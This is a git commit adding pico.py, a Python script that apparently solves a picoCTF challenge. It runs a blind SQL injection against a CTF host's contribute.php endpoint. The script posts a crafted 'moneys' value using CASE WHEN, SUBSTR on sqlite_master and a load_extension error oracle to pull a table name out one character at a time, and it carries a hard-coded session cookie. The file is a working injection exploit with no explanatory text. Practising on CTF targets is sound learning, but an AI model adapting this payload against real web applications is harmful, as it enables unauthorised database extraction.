a3092cb5e295147cb4c75c93740a2972c5153947
cybersecuritydef <155002701+cybersecuritydef@users.noreply.github.com>
2026-03-18 22:07:24 +0300

    Create pico.py

---
+++ pico.py
@@ -0,0 +1,17 @@
+import requests
+
+try:
+	flag = ""
+	alpha = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"
+	print("\nStart...\n")
+	host = "http://wily-courier.picoctf.net:53455/contribute.php"
+	for pos in range(1,18):
+		for ch in alpha:
+			resp = requests.post(host, cookies = {"PHPSESSID": "ebc8e920c23c0f665ac6dcf314a66ecc"}, data={"moneys":"34242' OR CASE WHEN ((SELECT SUBSTR(name,{},1) FROM sqlite_master WHERE type='table' LIMIT 1,1) = '{}') THEN 1 ELSE load_extension(1) END -- -".format(pos, ch)})
+			if "Unable to execute statement: not authorized" not in resp.text:
+				flag += ch
+				print(flag)
+				break
+	print("\nFinished\n")
+except:
+	exit(0)
